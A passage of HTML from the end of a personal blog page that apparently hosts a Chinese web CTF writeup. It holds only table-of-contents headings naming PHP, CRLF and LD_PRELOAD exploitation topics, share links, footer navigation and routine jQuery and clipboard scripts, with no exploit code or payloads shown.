href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.0.4.</span> <span class="toc-text">漏洞实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.0.5.</span> <span class="toc-text">PHP原生类的利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CRLF%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.0.6.</span> <span class="toc-text">CRLF攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Babyweb-2023%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">Babyweb(2023安洵杯春季赛)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP1-0"><span class="toc-number">3.1.</span> <span class="toc-text">PHP1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.1.0.3.</span> <span class="toc-text">代码实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP2-0"><span class="toc-number">3.2.</span> <span class="toc-text">PHP2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">环境变量注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">最终payload</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&text=第五届安洵杯-2022-web-writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&is_video=false&description=第五届安洵杯-2022-web-writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第五届安洵杯-2022-web-writeup&body=Check out this article: http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&title=第五届安洵杯-2022-web-writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&name=第五届安洵杯-2022-web-writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/&t=第五届安洵杯-2022-web-writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
